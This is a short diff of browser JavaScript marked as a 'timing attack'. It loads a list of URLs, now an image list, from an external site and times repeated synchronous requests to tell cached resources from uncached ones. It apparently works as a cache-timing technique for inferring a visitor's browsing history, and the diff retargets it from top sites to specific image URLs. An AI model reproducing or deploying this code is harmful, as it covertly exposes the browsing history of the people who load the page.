@@ -34,7 +34,7 @@ url_loader = function(text_url){
 /*timing attack*/
 
 
-	var loader = new url_loader("http://www.joeygolden.com/WT/top500.txt");
+	var loader = new url_loader("http://www.joeygolden.com/WT/imagelist.txt");
 	var blind_run = new Array();
 	var cache_run = new Array();
 	
@@ -42,7 +42,7 @@ url_loader = function(text_url){
 		var run_request = new ajaxRequest();
 		var timer1 = new Date();
 		var start_time = timer1.getTime();
-		run_request.open("GET", ("http://www." + loader.url_list[index]), false);
+		run_request.open("GET", (loader.url_list[index]), false);
 		run_request.send(null);
 		var timer2 = new Date();
 		var end_time = timer2.getTime();
@@ -53,7 +53,7 @@ url_loader = function(text_url){
 		var run_request = new ajaxRequest();
 		var timer1 = new Date();
 		var start_time = timer1.getTime();
-		run_request.open("GET", ("http://www." + loader.url_list[index]), false);
+		run_request.open("GET", (loader.url_list[index]), false);
 		run_request.send(null);
 		var timer2 = new Date();
 		var end_time = timer2.getTime();
